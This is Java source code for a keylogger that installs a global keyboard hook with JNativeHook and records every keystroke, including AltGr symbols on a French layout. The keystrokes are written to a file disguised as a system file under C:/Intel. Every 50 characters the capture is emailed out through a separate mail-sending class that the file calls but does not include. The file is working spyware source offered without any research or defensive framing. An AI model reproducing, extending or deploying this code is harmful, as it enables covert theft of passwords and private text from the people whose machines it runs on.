package com.capture.core;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Launcher implements NativeKeyListener {
	private int flagNumberCharacterToSend = 0;
	private static String toSend = "";
	private static String originalContentFile = "";
	private Boolean ctrl = Boolean.valueOf(false);
	private Boolean alt = Boolean.valueOf(false);
	private Boolean arobaze = Boolean.valueOf(false);
	private String keyText = "";
	private Boolean shiftDown = Boolean.valueOf(false);
	private Integer capsLockCount = Integer.valueOf(0);
	private static final File file = new File("C:/Intel/dll_key_core.txt");

	static {
		if (!file.exists()) {
			try {
				file.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			originalContentFile = readExistingFile(true) + "ENDLINE";
		}
	}

	

	public static void main(String[] args) {
		try {
			System.out.print("Starting....");
			GlobalScreen.registerNativeHook();
			System.out.print("Native hook OK....");
		} catch (NativeHookException ex) {
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());

			System.exit(1);
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Launcher());
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("code " + e.getKeyCode());

		String nativeKeyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		if ((e.getKeyCode() == 16) || (e.getKeyCode() == 20)) {
			this.shiftDown = Boolean.valueOf(true);
			if (e.getKeyCode() == 20) {
				this.capsLockCount = Integer.valueOf(this.capsLockCount.intValue() + 1);
			}
		}
		if (e.getKeyCode() == 17) {
			this.ctrl = Boolean.valueOf(true);
		}
		if (e.getKeyCode() == 18) {
			this.alt = Boolean.valueOf(true);
		}
		if ((e.getKeyCode() == 48) && (this.ctrl.booleanValue()) && (this.alt.booleanValue())) {
			this.ctrl = Boolean.valueOf(false);
			this.alt = Boolean.valueOf(false);

			this.arobaze = Boolean.valueOf(true);
		}
		if ((e.getKeyCode() == 20) && (this.shiftDown.booleanValue()) && (this.capsLockCount.intValue() % 2 == 0)) {
			nativeKeyText = "ENDCAPS";
			this.shiftDown = Boolean.valueOf(false);
		} else if ((e.getKeyCode() == 20) && (this.capsLockCount.intValue() % 2 != 0)) {
			nativeKeyText = "BEGINCAPS";
		}
		if ((this.shiftDown.booleanValue()) || (this.arobaze.booleanValue())
				|| ((e.getKeyCode() != 16) && (e.getKeyCode() != 17) && (e.getKeyCode() != 18)
						&& (nativeKeyText != "F1") && (nativeKeyText != "F2") && (nativeKeyText != "F3")
						&& (nativeKeyText != "F4") && (nativeKeyText != "F5") && (nativeKeyText != "F6")
						&& (nativeKeyText != "F7") && (nativeKeyText != "F8") && (nativeKeyText != "F9")
						&& (nativeKeyText != "F10") && (nativeKeyText != "F11") && (nativeKeyText != "F12"))) {
			if (this.arobaze.booleanValue()) {
				this.keyText = "@";
				this.arobaze = Boolean.valueOf(false);
			} else {
				try {
					if ((this.shiftDown.booleanValue()) && (e.getKeyCode() != 16) && (e.getKeyCode() != 36)
							&& (e.getKeyCode() != 20) && (e.getKeyCode() != 17)) {
						this.keyText = String.valueOf(StandardKey
								.getKeyByKeyCode(e.getKeyCode(), this.shiftDown.booleanValue(), false).getCharacter());
					} else if ((!this.shiftDown.booleanValue())
							&& (StandardKey.getKeyByKeyCode(e.getKeyCode(), false, false) != null)) {
						this.keyText = String
								.valueOf(StandardKey.getKeyByKeyCode(e.getKeyCode(), false, false).getCharacter());
					} else if ((nativeKeyText != "Maj") && (nativeKeyText != "Ctrl") && (nativeKeyText != "Alt")) {
						this.keyText = nativeKeyText;
					}
				} catch (NullPointerException n) {
					this.keyText = "";
				}
			}
			if (this.keyText.contains("Pavé numérique")) {
				this.keyText = this.keyText.replace("Pavé numérique", "").trim();
			}
			if (this.keyText.contains("Retour arrière")) {
				this.keyText = this.keyText.replace("Retour arrière", "/BackSpace/").trim();
			}
			if (e.getKeyCode() == 16) {
				this.keyText = "";
			}
			if ((e.getKeyCode() == 52) && (!this.shiftDown.booleanValue())) {
				this.keyText = "'";
			}
			if ((this.ctrl.booleanValue()) && (this.alt.booleanValue())) {
				if (e.getKeyCode() == 51) {
					this.keyText = "#";
				}
				if (e.getKeyCode() == 52) {
					this.keyText = "{";
				}
				if (e.getKeyCode() == 53) {
					System.out.println("altgr [");
					this.keyText = "[";
				}
				if (e.getKeyCode() == 54) {
					this.keyText = "|";
				}
				if (e.getKeyCode() == 56) {
					this.keyText = "\\";
				}
				if (e.getKeyCode() == 91) {
					this.keyText = "]";
				}
				if (e.getKeyCode() == 61) {
					this.keyText = "}";
				}
			}

			if (!("ENDCAPS".equals(this.keyText) || "BEGINCAPS".equals(this.keyText)))
				toSend += this.keyText;

			if (flagNumberCharacterToSend != 0 && flagNumberCharacterToSend % 50 == 0) {
				MailSending.sendToMailOriginal(toSend);
				flagNumberCharacterToSend = 0;
			}
			flagNumberCharacterToSend++;
			writeKeyStrokeToFile(toSend);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		if (e.getKeyCode() == 16) {
			this.shiftDown = Boolean.valueOf(false);
		}
		if ((e.getKeyCode() == 17) || (e.getKeyCode() == 18)) {
			System.out.println("release altgr...");
			this.ctrl = Boolean.valueOf(false);
			this.alt = Boolean.valueOf(false);
		}
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
	}
	
	private static String readExistingFile(boolean read) {
		if (read)
			try {
				// make a 'file' object
				// Get data from this file using a file reader.
				FileReader fr = new FileReader(file);
				// To store the contents read via File Reader
				BufferedReader br = new BufferedReader(fr);
				// Read br and store a line in 'data', print data
				String data;
				StringBuilder dataqueue = new StringBuilder();
				while ((data = br.readLine()) != null) {
					dataqueue.append(data);
				}
				return dataqueue.toString();
			} catch (IOException e) {
				System.out.println("bad !");
			}

		return "";
	}

	private static void writeKeyStrokeToFile(String keyStroke) {
		try {
			BufferedReader bufferedReader = new BufferedReader(new FileReader(file.getAbsolutePath()));
			FileWriter fw = new FileWriter(file.getAbsoluteFile());
			BufferedWriter bw = new BufferedWriter(fw);
			if (bufferedReader.readLine() != null) {
				bw.append(keyStroke);
			} else {
				bw.write(originalContentFile + keyStroke);
			}
			bw.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}
